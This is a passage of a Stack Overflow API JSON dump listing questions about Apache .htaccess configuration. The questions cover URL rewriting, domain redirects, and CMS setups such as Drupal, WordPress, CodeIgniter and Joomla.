to</p>\n\n<pre><code>threads/2486-dell-inspiron-545-grafikkarte-austauschen/page3\n</code></pre>\n\n<p>and I have been starting the write the rule but I'm not sure if is the right way to do it or not</p>\n\n<pre><code>RewriteRule ^threads/([0-9]+)-([a-zA-Z0-9_-]+)/$page  /threads/$1-$2/page$3 [R,L]\n</code></pre>\n"},{"tags":[".htaccess","mod-rewrite","apache2"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":12510335,"title":".htaccess protect urls with query string combinations","body":"<p>I need to protect a \"single logical\" url in a Joomla CMS with htaccess. I found here <a href=\"http://stackoverflow.com/questions/2670535/htaccess-code-to-protect-a-single-url\">.htaccess code to protect a single url?</a></p>\n\n<p>this solution, which works great for a specific url:</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{REQUEST_URI}  ^/index\\.php$\nRewriteCond %{QUERY_STRING} ^option=com_content&amp;task=view&amp;id=76$\nRewriteRule ^(.*)$ /secure.htm\n</code></pre>\n\n<p>However, how can I make sure that the url parts can't be swapped around or amended, therefore circumventing the secure access. For example I don't want to allow access to </p>\n\n<pre><code>option=com_content&amp;task=view&amp;id=76&amp;dummy=1 \noption=com_content&amp;id=76&amp;task=view\n</code></pre>\n\n<p>either.</p>\n\n<p>I have tried this, which doesn't seem to work:</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{REQUEST_URI}  ^/index\\.php$\nRewriteCond %{QUERY_STRING} option=com_content\nRewriteCond %{QUERY_STRING} task=view\nRewriteCond %{QUERY_STRING} id=76\nRewriteRule ^(.*)$ /secure.htm\n</code></pre>\n"},{"tags":[".htaccess"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":22,"score":0,"question_id":12512578,"title":"URL forwarding with masking using .htaccess configuration","body":"<p>I have domain and space on separate providers. I have <b>domain1.com</b>, when users\ntype this in browser they should be redirected to <b>domain2.com/somefolder</b>. </p>\n\n<p>domain2.com is hosted on the server where i have full control on .htaccess file.\nSo please provide me the changes to be done on <b>domain2.com/somefolder's</b> .htaccess\nfile </p>\n\n<p>I have tried with </p>\n\n<pre><code>Options +FollowSymlinks\nOptions All -Indexes\nOptions Indexes Includes FollowSymLinks ExecCGI\nRewriteEngine on\nRewriteRule ^&amp;urlink=(.*) http://$1 [P]\n</code></pre>\n\n<p>But it doesn't work.</p>\n"},{"tags":["php","mysql","apache",".htaccess","drupal"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":165,"score":0,"question_id":12506753,"title":"drupal Not Found The requested url was not found on this server","body":"<p>I have been stuck in a strange situation from past two days. I have a drupal installation in my <code>/var/www/html</code> document root directory with a name of drupal and I am accessing it with the url 'http://domainname/drupal'. It is opening fine. In <code>settings.php</code> of <code>drupal/sites/default</code> directory I have set <code>$base_url</code> as <code>http://domainname/drupal</code>. In the same directory <code>/var/www/html</code> I have created the copy of drupal with a name of <code>drupalsix</code>. I exported the database of the project drupal &amp; created a new database and associated <code>drupalsix</code> with it. I changed the required <code>$db_url</code> settings in <code>settings.php</code>of <code>drupalsix/sites/default/settings.php</code> file. I also changed the <code>$base_url</code> variable to <code>http://domainname/drupalsix</code>. when I try to open the url <code>http://domainname/drupalsix</code> it is not opening &amp; a message <code>Not Found The requested url was not found on this server</code> is getting displayed. I have copied the <code>.htaccess</code> file from drupal to drupalsix directory correctly &amp; the <code>clean url</code> is also disabled. In my <code>httpd.conf</code> file I have <code>AllowOverride All</code> for both drupal &amp; drupal six as shown below:-</p>\n\n<pre><code>&lt;Directory /var/www/html/drupal&gt;\n    AllowOverride All\n&lt;/Directory&gt;   \nAccessFileName .htaccess\n\n&lt;Directory /var/www/html/drupalsix&gt;\n    AllowOverride All\n&lt;/Directory&gt;\nAccessFileName .htaccess \n</code></pre>\n\n<p>I am also attaching the .htaccess file here for reference. Please help me becouse I am not finding what is wrong in my set up. For drupal everything is openining fine but for drupalsix it is showing not found. My operating system is cent os linux. Thanks in advance\nhere is my .htaccess file</p>\n\n<pre><code>#\n# Apache/PHP/Drupal settings:\n#\n\n# Protect files and directories from prying eyes.\n&lt;FilesMatch \"\\.(engine|inc|info|install|make|module|profile|test|po|sh|.*sql|theme|tpl(\\.php)?|xtmpl|svn-base)$|^(code-style\\.pl|Entries.*|Repository|Root|Tag|Template|all-wcprops|entries|format)$\"&gt;\n  Order allow,deny\n&lt;/FilesMatch&gt;\n\n# Don't show directory listings for URLs which map to a directory.\nOptions -Indexes\n\n# Follow symbolic links in this directory.\nOptions +FollowSymLinks\n\n# Make Drupal handle any 404 errors.\nErrorDocument 404 /index.php\n\n# Force simple error message for requests for non-existent favicon.ico.\n&lt;Files favicon.ico&gt;\n  # There is no end quote below, for compatibility with Apache 1.3.\n  ErrorDocument 404 \"The requested file favicon.ico was not found.\n&lt;/Files&gt;\n\n# Set the default handler.\nDirectoryIndex index.php kjsfgbvytuilwecftuwel\n\n# Override PHP settings. More in sites/default/settings.php\n# but the following cannot be changed at runtime.\n\n# PHP 4, Apache 1.\n&lt;IfModule mod_php4.c&gt;\n  php_value magic_quotes_gpc                \n  php_value register_globals                0\n  php_value session.auto_start              0\n  php_value mbstring.http_input             pass\n  php_value mbstring.http_output            pass\n  php_value mbstring.encoding_translation   0\n&lt;/IfModule&gt;\n\n# PHP 4, Apache 2.\n&lt;IfModule sapi_apache2.c&gt;\n  php_value magic_quotes_gpc                0\n  php_value register_globals                0\n  php_value session.auto_start              0\n  php_value mbstring.http_input             pass\n  php_value mbstring.http_output            pass\n  php_value mbstring.encoding_translation   0\n&lt;/IfModule&gt;\n\n# PHP 5, Apache 1 and 2.\n&lt;IfModule mod_php5.c&gt;\n  php_value magic_quotes_gpc                0\n  php_value register_globals                0\n  php_value session.auto_start              0\n  php_value mbstring.http_input             pass\n  php_value mbstring.http_output            pass\n  php_value mbstring.encoding_translation   0\n&lt;/IfModule&gt;\n\n# Requires mod_expires to be enabled.\n&lt;IfModule mod_expires.c&gt;\n  # Enable expirations.\n  ExpiresActive On\n\n  # Cache all files for 2 weeks after access (A).\n  ExpiresDefault A1209600\n\n  &lt;FilesMatch \\.php$&gt;\n    # Do not allow PHP scripts to be cached unless they explicitly send cache\n    # headers themselves. Otherwise all scripts would have to overwrite the\n    # headers set by mod_expires if they want another caching behavior. This may\n    # fail if an error occurs early in the bootstrap process, and it may cause\n    # problems if a non-Drupal PHP file is installed in a subdirectory.\n    ExpiresActive Off\n  &lt;/FilesMatch&gt;\n&lt;/IfModule&gt;\n\n# Various rewrite rules.\n&lt;IfModule mod_rewrite.c&gt;\n  RewriteEngine on\n\n  # If your site can be accessed both with and without the 'www.' prefix, you\n  # can use one of the following settings to redirect users to your preferred\n  # URL, either WITH or WITHOUT the 'www.' prefix. Choose ONLY one option:\n  #\n  # To redirect all users to access the site WITH the 'www.' prefix,\n  # (http://example.com/... will be redirected to http://www.example.com/...)\n  # adapt and uncomment the following:\n  # RewriteCond %{HTTP_HOST} ^example\\.com$ [NC]\n  # RewriteRule ^(.*)$ http://www.example.com/$1 [L,R=301]\n  #\n  # To redirect all users to access the site WITHOUT the 'www.' prefix,\n  # (http://www.example.com/... will be redirected to http://example.com/...)\n  # uncomment and adapt the following:\n  # RewriteCond %{HTTP_HOST} ^www\\.example\\.com$ [NC]\n  # RewriteRule ^(.*)$ http://example.com/$1 [L,R=301]\n\n  # Modify the RewriteBase if you are using Drupal in a subdirectory or in a\n  # VirtualDocumentRoot and the rewrite rules are not working properly.\n  # For example if your site is at http://example.com/drupal uncomment and\n  # modify the following line:\n  # RewriteBase /drupal\n  #\n  # If your site is running in a VirtualDocumentRoot at http://example.com/,\n  # uncomment the following line:\n  # RewriteBase /\n\n  # Rewrite URLs of the form 'x' to the form 'index.php?q=x'.\n  RewriteCond %{REQUEST_FILENAME} !-f\n  RewriteCond %{REQUEST_FILENAME} !-d\n  RewriteCond %{REQUEST_URI} !=/favicon.ico\n  RewriteRule ^(.*)$ index.php?q=$1 [L,QSA]\n&lt;/IfModule&gt;\n\n# $Id$\n</code></pre>\n"},{"tags":["wordpress",".htaccess","cakephp"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":96,"score":0,"question_id":11611636,"title":"how to redirect /app/webroot/bolg/wp-admin to blog/wp-admin, .htacsess is not working","body":"<p>I have change /app/webroot/blog/.htacsess to </p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /app/webroot/blog/\nRewriteRule ^index\\.php$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /app/webroot/blog/index.php [L]\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>and root /.htacsess to</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n   RewriteEngine on\n   RedirectMatch temp ^/blog/wp-admin$ http://mysite.com/blog/wp-admin/\n    RewriteRule blog$ /blog/ [L]\n    RewriteRule blog/wp-admin$ /blog/wp-admin/ [L]\n    RewriteRule ^$ app/webroot/ [L]\n    RewriteRule (.*) app/webroot/$1 [L]\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>my site is redirect to <a href=\"http://mysite.com/blog/\" rel=\"nofollow\">http://mysite.com/blog/</a> but when I try lo login into admin site like <a href=\"http://mysite.com/blog/wp-admin\" rel=\"nofollow\">http://mysite.com/blog/wp-admin</a> it redirect to <a href=\"http://mysite.com/app/webroot/blog/wp-admin\" rel=\"nofollow\">http://mysite.com/app/webroot/blog/wp-admin</a> and my username and password is not working.</p>\n\n<p>but if I write hardcode url \"http://mysite.com/blog/wp-login.php\" then my username and password is working.</p>\n\n<p>How to solve this problem? please help me...</p>\n"},{"tags":[".htaccess","mod-rewrite","http-status-code-301","dns"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":1825,"score":1,"question_id":881640,"title":"How do I 301 redirect one domain to the other if the first has a folder path","body":"<p>I want to 301 redirect from: www.olddomain.com to the root of newdomain.com but I want it to work no matter what the folder path is on the old domain. eg: the following should all redirect to the root of newdomain.com</p>\n\n<pre><code>www.olddomain.com\nolddomain.com\nwww.olddomain.com/folder/file.php\nolddomain.com/folder/file.php\n</code></pre>\n\n<p>How can I do that with Mod Rewrite in the .htaccess file?</p>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":34,"score":1,"question_id":12497949,"title":"Detect if server is redirecting via a .htaccess file","body":"<p>I've created a .htaccess file to redirect a specific IP address to another file:</p>\n\n<pre><code># Allow rewriting of htaccess\nRewriteEngine On\nRewriteBase /\n\n# Get remote address/block of addresses to redirect\nRewriteCond %{REMOTE_ADDR} 127\\.0\\.0\\.1\n\n# Define the file being accessed\nRewriteCond %{REQUEST_URI} /index\\.php$\n\n# When the remote address(es) try to access the file above redirect them to the file below\nRewriteRule .* /other-index\\.php [R,L]\n</code></pre>\n\n<p>This works well and the above redirects localhost to other-index.php if it tries to access index.php but allows all other remote hosts to access index.php.</p>\n\n<p>The remote host is calling: <a href=\"http://www.example.com/index.php\" rel=\"nofollow\">http://www.example.com/index.php</a></p>\n\n<p>My question is can the remote host (in this case localhost) find out that it is being redirected by the server?</p>\n"},{"tags":[".htaccess","redirect","dns"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":126,"score":3,"question_id":4704195,"title":"Changing Site Domain","body":"<p>Quick htaccess question</p>\n\n<p>I am changing the domain associated with a site and want to know if I can setup the htaccess to make the following types of redirects:</p>\n\n<p><strong>Redirect</strong>\n<a href=\"http://www.oldomain.com/contact-us\" rel=\"nofollow\">http://www.oldomain.com/contact-us</a></p>\n\n<p><strong>to</strong>\n<a href=\"http://www.newdomain.com/contact-us\" rel=\"nofollow\">http://www.newdomain.com/contact-us</a></p>\n\n<p>Basically a global redirect that redirects to the new domain but keeps the rest of the URL that the user typed.</p>\n\n<p><strong>UPDATE:</strong>\nI ended up using the following code and it works perfectly</p>\n\n<pre><code>Options +FollowSymLinks\nRewriteEngine On\nRewriteCond %{HTTP_HOST} ^olddomain.com$ [OR]\nRewriteCond %{HTTP_HOST} ^www.olddomain.com$\nRewriteRule (.*)$ http://www.newdomain.com/$1 [R=301,L]\n</code></pre>\n"},{"tags":["apache",".htaccess","redirect","rewrite","subdomain"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":24,"score":1,"question_id":12507318,"title":"Can I use htaccess to invisibly redirect one domain to a subdomain on another domain?","body":"<p>I've been pulling my hair out trying to research this and find out if this is possible. Any help would be appreciated.</p>\n\n<p>I have two domains. Let's call them foo.com and bar.com. I only have one web server, so right now, they're pointing to the same place.</p>\n\n<p>I have a separate site set up at bar.foo.com.</p>\n\n<p>I want all visits to bar.com to go to bar.foo.com, but still say \"bar.com\" in the browser's address bar.</p>\n\n<p>Here's what I've got in my htaccess:</p>\n\n<pre><code>RewriteEngine on\nRewriteCond %{HTTP_HOST} ^bar.com$ [NC]\nRewriteRule ^(.*)$ http://foo.bar.com/$1 [R=301,L]\n</code></pre>\n\n<p>This successfully redirects it, but, you end up seeing \"foo.bar.com\" in the address bar.</p>\n\n<p>Using htaccess, can I get this redirect to happen \"invisibly\", so that if the user types in \"bar.com\", they will still see \"bar.com\" in the browser?</p>\n\n<p>I don't have access to the apache config files on the server, so I'm limited to what I can put in a htaccess file.</p>\n\n<p>Any help or advice would be much appreciated.</p>\n\n<p>Thanks!</p>\n"},{"tags":[".htaccess","folder"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":24,"score":0,"question_id":12498261,"title":"php how to allow some in a folder and not allow others in that folder","body":"<ul>\n<li>I am hosting my website on hostmonster.com.</li>\n<li>I am using php/mysql.</li>\n<li>I have a folder with pdf files: <em>pfdfolder/</em>.</li>\n<li>I want to give access to some users to that folder and deny access to other users to that folder. How do I go about it ?</li>\n</ul>\n\n<p>I don't know if it helps but I have a mysql with username and passwords if maybe I can use that. </p>\n"},{"tags":["php",".htaccess","opencart"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":12505860,"title":"Change max length of a URL param","body":"<p>I need to <code>GET</code> a param with a length of 1727 characters, now, I can get only 512. How I can do this with <code>.htaccess</code>?</p>\n\n<p>Current <code>htaccess</code>:</p>\n\n<pre><code>RewriteBase /\nRewriteRule ^sitemap.xml$ index.php?route=feed/google_sitemap [L]\nRewriteRule ^googlebase.xml$ index.php?route=feed/google_base [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_URI} !.*\\.(ico|gif|jpg|jpeg|png|js|css)\nRewriteRule ^([^?]*) index.php?_route_=$1 [L,QSA]\n</code></pre>\n"},{"tags":["regex","apache",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":12505096,"title":"regex in my RewriteRule is OK, but .htaccess does not work","body":"<p>I'm having a lot of trouble getting my .htaccess ReWrite to work on my apache web server.  I've read several tutorials and tested my regex matching with Grep.</p>\n\n<p>Here is the code:</p>\n\n<pre><code>    RewriteRule \\?action=viewArticle&amp;articleId=([0-9]*)&amp;categoryId=([0-9])$ essays/$1 [R=301,L]\n</code></pre>\n\n<p>here is a url I'm trying to match: </p>\n\n<pre><code>http://mysite.com/?action=viewArticle&amp;articleId=15&amp;categoryId=1\n</code></pre>\n\n<p>and change to </p>\n\n<pre><code>http://mysite.com/essays/15\n</code></pre>\n\n<p>UPDATE: Solution! with a very <a href=\"http://stackoverflow.com/questions/11709634/convert-original-url-to-friendly-url/11711948#11711948\">excellent tutorial</a> from Jon.  It was very important that I put <code>&lt;base href=\"/\"&gt;</code> in my header file to get the css to work correctly.</p>\n\n<p>Final rewrite looked like this: </p>\n\n<pre><code>RewriteCond %{THE_REQUEST} /?action=viewArticle&amp;articleId=([0-9]*)&amp;categoryId=([0-9])\nRewriteRule ^$ /essays/%1? [R=301,L,NE]\n\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^essays/([0-9]+) /?action=viewArticle&amp;articleId=$1&amp;categoryId=([0-9]) [L]\n</code></pre>\n"},{"tags":["html",".htaccess","webserver","boilerplate","business-catalyst"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":149,"score":1,"question_id":7539554,"title":"How to use Boilerplate on Business Catalyst as it does not allow Web server configuration","body":"<p>I want to use <a href=\"http://html5boilerplate.com/\" rel=\"nofollow\">Boilerplate</a> for my Adobe Business Catalyst Template. Every thing is fine but it(BC) do not allow .htaccess file as its an hosted solution. What alternatives are there to go without .htaccess file? </p>\n\n<p>I also posted on official Business Catalyst Support Forum but all in vain. </p>\n"},{"tags":["wordpress",".htaccess","http","https","robots.txt"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":71,"score":1,"question_id":12486737,"title":"Weird Https / Http error in my robots.txt which relates to .htaccss file","body":"<p>I've set up a website, like I have done a lot of times before but getting an erorr when you actually google the site.</p>\n\n<blockquote>\n  <p>clrhorizon.com/ \n  A description for this result is not available because\n  of this site's robots.txt – learn more.</p>\n</blockquote>\n\n<p>Is the message I see</p>\n\n<p>If you hoover over \"clrhorizon.com\" this just shows a normal url which goes to the homepage. </p>\n\n<p>But if you hoover over the \"robots.txt\" file it goes to \"https://clrhorizon.com/robots.txt\nWhich is strange since I don't have a ssl certificate on the website which is build on wordpress. </p>\n\n<p>If you then click the \"robots.txt\" link I get a weird error:</p>\n\n<p><code>&lt;META HTTP-EQUIV=\"Refresh\" CONTENT=\"0;URL=http://clrhorizon.systempartners.com/robots.txt\"&gt;&lt;h1&gt;&lt;a href=http://clrhorizon.systempartners.com/robots.txt&gt;VIEW TEMPORARY SITE&lt;/a&gt;&lt;/h1&gt;</code></p>\n\n<p>And the url here isn't https anymore. \nGone through hours of support with hosting to see where the error was but no luck. \nThey suggested to clear my .robots.txt file and wait it out. </p>\n\n<p>On a different thread I found a potential solution but no luck so far (read that it should update instantly).\nCurrent .htaccess file is:</p>\n\n<pre><code>&gt;     # BEGIN WordPress\n&gt; \n&gt; &lt;IfModule mod_rewrite.c&gt; \n&gt; RewriteEngine On \n&gt; RewriteCond %{HTTPS} on\n&gt; RewriteRule (.*) http://%{HTTP_HOST}%{REQUEST_URI} \n&gt; RewriteBase /\n&gt; RewriteRule ^index\\.php$ - [L] \n&gt; RewriteCond %{REQUEST_FILENAME} !-f\n&gt; RewriteCond %{REQUEST_FILENAME} !-d \n&gt; RewriteRule . /index.php [L]\n&gt; &lt;/IfModule&gt;\n&gt; \n&gt; # END WordPress\n</code></pre>\n\n<p>I am loosing ideas on where the error should be. </p>\n\n<p>Hope anyone can help?</p>\n"},{"tags":[".htaccess","codeigniter","apache2","codeigniter-url"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":12503826,"title":".htaccess Prevents Forms from Posting","body":"<p>I'm using this snippet in .htaccess to pull out index.php from the url in codeigniter:</p>\n\n<pre><code>RewriteCond %{HTTP:X-Requested-With} !^XMLHttpRequest$\nRewriteCond %{THE_REQUEST}       ^[^/]*/index\\.php [NC]\nRewriteRule ^index\\.php(.*)$     $1 [R=301,NS,L]\n</code></pre>\n\n<p>Everything seems to be working just fine except that form posts cannot get through.  If I comment out the rule the post will get through.</p>\n\n<p>Anyone know of a way to remove index.php from the url but keep form posts intact?</p>\n\n<p>I don't just want the url to work without index.php, I want index.php to be removed if it is present.</p>\n\n<p>Thanks in advance!</p>\n"}]}
{"total":14528,"page":16,"pagesize":100,"questions":[{"tags":[".htaccess","codeigniter","url-rewriting","codeigniter-url"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":227,"score":1,"question_id":7695423,"title":"htaccess rewrite for codeigniter site","body":"<p>I want to rewrite code for codeigniter url rewrite.</p>\n\n<p>I have used following code.</p>\n\n<pre><code>RewriteEngine On\nRewriteBase /whype\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ index.php?/$1 [L]\n\nRewriteRule ^admin$ administration\nRewriteRule ^video/([0-9]+)/(.*)$ videos/details/$1/$1\n</code></pre>\n\n<p>It is working well for index.php removal.\nBut it doesn't work for url rewrite</p>\n\n<p>i want <code>example.com/admin</code> becomes <code>example.com/administration</code></p>\n\n<p>and </p>\n\n<p><code>example.com/video/123/title</code> becomes <code>example.com/videos/details/123/title</code></p>\n\n<p>Thanks in advance,\nw3father</p>\n"},{"tags":["apache",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":12502885,"title":"How to exclude all files and directories except one directory, RewriteCond","body":"<p>I would like to redirect all non-files, non-directories to index.php, so everything that exists is directly accessible - except for one directory (which should also go to index.php)</p>\n\n<p>What I have is:</p>\n\n<pre><code># Files\nRewriteCond %{REQUEST_FILENAME} !-f\n\n# Directories except /orderfiles/*\nRewriteCond %{REQUEST_FILENAME} ^/(orderfiles/)* [OR]\nRewriteCond %{REQUEST_FILENAME} !-d\n\nRewriteRule .* index.php [L,QSA]\n</code></pre>\n\n<p>This works for <strong>directories</strong> inside /orderfiles, but a <strong>files</strong> inside of /orderfiles still goes to that file. I tried adding </p>\n\n<pre><code>RewriteCond %{REQUEST_FILENAME} ^/(orderfiles/)* [OR]\nRewriteCond %{REQUEST_FILENAME} !-f\n</code></pre>\n\n<p>But this breaks and sends every file to index.php.</p>\n"},{"tags":["apache",".htaccess","joomla"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":23,"score":0,"question_id":12502896,"title":"joomla in subdirecory","body":"<p>I can't setup joomla in my servers subdirectory. In server's main dir i have .htaccess :</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n RewriteCond %{HTTP_HOST} joomlasite.domaniew.pl\n RewriteCond %{REQUEST_URI} !^/joomlasite\n RewriteRule ^(.*)$ one/$1 [L]\n\n RewriteRule    ^$ app/webroot/    [L]\n RewriteRule    (.*) app/webroot/$1 [L]\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>and in joomlasite subdir i have .htaccess:</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n  RewriteEngine On\n  RewriteCond %{REQUEST_FILENAME} !-d\n  RewriteCond %{REQUEST_FILENAME} !-f\n  RewriteRule ^(.*)$ index.php/$1 [QSA,L]\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>I tried several diffrent combinations but still I got error:\n<code>Parse error: syntax error, unexpected '=', expecting '(' in /homez.221/myserver/www/joomlasite/includes/framework.php on line 42</code></p>\n\n<p>How can I make it work ?</p>\n"},{"tags":["php","arrays",".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":12502007,"title":"Loading random image from a directory with php","body":"<p>I need to select a random image from a directory. I've seen a few approaches that use glob(); but I'm hoping to use the scandir(); function.</p>\n\n<pre><code>function random_img(){\n$imageDir =  wptouch_get_bloginfo('template_directory').'/images/default-tiles/';\n$images = scandir($imageDir);\n$randomImage = $images[array_rand($images)];\n\nreturn $randomImage;\n}\n</code></pre>\n\n<p>The function above should pull an image but instead i'm getting this error:</p>\n\n<p><em>scandir(\"/myfile/directory/\") failed to open dir: not implemented in \"/myfile/directory/\"</em></p>\n"},{"tags":["php","wordpress",".htaccess","permalinks"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":12501660,"title":"Custom Querystring on Wordpress Permalink Page","body":"<p>i'm having a really difficult time getting this to work...</p>\n\n<p>Basically - I have a url</p>\n\n<pre><code>http://www.mysite.com/calendar-of-events\n</code></pre>\n\n<p>i'm trying to make it so i can pass the month and year via querystrings like</p>\n\n<pre><code>http://www.mysite.com/calendar-of-events?m=10&amp;y=2012\n</code></pre>\n\n<p>however - anytime i do that i'm getting a 404 page not found in wordpress</p>\n\n<p>Im not sure how I can configure the rewriting to allow a url like that AND allow me to access those querystring values</p>\n\n<p>I really appreciate your guidance on this!!</p>\n\n<p>Loren</p>\n"},{"tags":["php",".htaccess","get","rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":12442872,"title":"RewriteRule and php get variables","body":"<p>Here is my challenge.</p>\n\n<p>My www.mysite.com/lab/brand/folder/modify.php page has a flash app that get a variable from the url for example www.mysite.com/lab/brand/folder/modify.php?id=1234  The flash app pulls the 1234 as the id and there are a ton of files located in the folders near that app that I can't move and keep the app working correctly.</p>\n\n<p>I tried the following but the app doesn't pull in the get variable. It does rewrite the url but the flash app doesn't seem to get the variable.</p>\n\n<p>^lab/modify/([0-9]+)/?$ lab/brand/folder/modify.php?id=$1 [QSA,L]</p>\n\n<p>I'd be happy with the rewriten url to look like www.mysite.com/lab/modify.php?id=1234 if that would work for get get variable but I don't know how to write this.  I tried the following but that didn't work so I know I'm writing this wrong.</p>\n\n<p>^lab/modify.php?id=([0-9]+)/?$ lab/brand/folder/modify.php?id=$1 [QSA,L]</p>\n\n<p>Any help you can provide would be greatly appreciated.</p>\n\n<p>Thanks\nLP</p>\n"},{"tags":["apache",".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":20,"score":0,"question_id":12493019,"title":"Changing the URL within .htaccess","body":"<p>I'll try and explain this the best I can; I have two domain names: <code>www.original.com</code> and <code>www.mysite.com/</code>. Within the site for <code>www.original.com</code> there is no content and all the content is hosted in <code>www.mysite.com/original/</code>. Now, when I visit <code>www.original.com</code> I have set up a redirect like this:</p>\n\n<pre><code>redirectMatch 307 ^(.*)$ http://www.mysite.com/original\n</code></pre>\n\n<p>However, I have realised that this is not what I need, because I would like the visitors of the <code>www.original.com</code> site to see <code>www.original.com</code> on the address bar, and not <code>http://www.mysite.com/original</code>. Is there any way to do this in .htaccess? I used to do it in the cPanel of my old hosting account via an addon domain, but the hosting I have now (united-domains.de) do not provide addon domains, apparently.</p>\n\n<p>Thanks</p>\n"},{"tags":["php",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":3,"view_count":44,"score":-3,"question_id":12500216,"title":"htaccess redirect all pages with parameters","body":"<p>I need all pages on my site to be redirected to home.php with query string and the page as parameter</p>\n\n<p>examples:</p>\n\n<pre><code>   www.site.com/abcd\n-&gt; www.site.com/home.php?page=abcd\n\n   www.site.com/abcd/file.php\n-&gt; www.site.com/home.php?page=abcd/file.php\n\n   www.site.com/file.php?a=b&amp;c=d\n-&gt; www.site.com/home.php?page=file.php&amp;args=\"a=b&amp;c=d\"\n</code></pre>\n"},{"tags":[".htaccess","redirect"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":11,"score":0,"question_id":12498333,"title":"redirect with .htaccess: USER@domain.com to domain.com/index.php?user=USER","body":"<p>How to make redirect with .htaccess from USER@domain.com (when I write it in browser) to <a href=\"http://domain.com/index.php?user=USER\" rel=\"nofollow\">http://domain.com/index.php?user=USER</a></p>\n\n<p>Thanks!</p>\n"},{"tags":["php","html",".htaccess","mod-rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":46,"score":2,"question_id":12492261,"title":".htaccess modrewrite breaks my forms","body":"<p>I've added a modrewrite to my .htaccess and now all of my forms don't send post data to php scripts.</p>\n\n<p>Code:\neg: my .htaccess removes the .php extension, removes the trailing slash if it's a directory.</p>\n\n<pre><code>RewriteEngine On\n\n# Redirect index to site root\nRewriteCond %{HTTP_HOST} ^mysite.com [NC]\nRewriteRule ^(.*)$ http://www.mysite.com/$1 [R=301,NC]\nRewriteRule ^index.php$ http://www.mysite.com/ [R=301,L]\n\n# Unless directory, remove trailing slash\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^([^/]+)/$ http://www.mysite.com/$1 [R=301,L]\n\n# Redirect external .php requests to extensionless url\nRewriteCond %{THE_REQUEST} ^(.+)\\.php([#?][^\\ ]*)?\\ HTTP/\nRewriteRule ^(.+)\\.php$ http://www.mysite.com/$1 [QSA,R=301,L]\n\n# Resolve .php file for extensionless php urls\nRewriteRule ^([^/.]+)$ $1.php [QSA,L]\n</code></pre>\n\n<p><strong>Is there a way of adding exceptions to the modrewrite rules so certain files/directories are ignored?</strong> So all files called form-process.php, email-process.php, upload-process.php, save-process.php could be ignored?</p>\n\n<p>edit: I've just been reading that I can add !POST to my query. If I add it like this, would it work?</p>\n\n<pre><code># Redirect external .php requests to extensionless url\nRewriteCond %{THE_REQUEST} ^(.+)\\.php([#?][^\\ ]*)?\\ HTTP/ !POST\nRewriteRule ^(.+)\\.php$ http://www.mysite.com/$1 [R=301,L]\n\n# Resolve .php file for extensionless php urls\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_FILENAME}\\.php -f !POST\nRewriteRule ^([^/.]+)$ $1.php [L]\n</code></pre>\n\n<p>edit: also added [QSA] to the rules above, but still no variables are passed to my forms</p>\n\n<p><strong>edit: For anyone else stuck with this problem I fixed it by selecting the files that posted data and removing them from the changes to the .htaccess file. It's not ideal, but it works for now.</strong></p>\n\n<pre><code># ignore recipes page\nRewriteRule ^directorytoremove - [L,NC]\nRewriteRule ^filenametoremove - [L,NC]\n</code></pre>\n\n<p>Redirect 301 does not pass any data via POST, even if you add QSA. So you need to do a post-redirect-get eg your form POSTS the data, is redirected and the receiving file 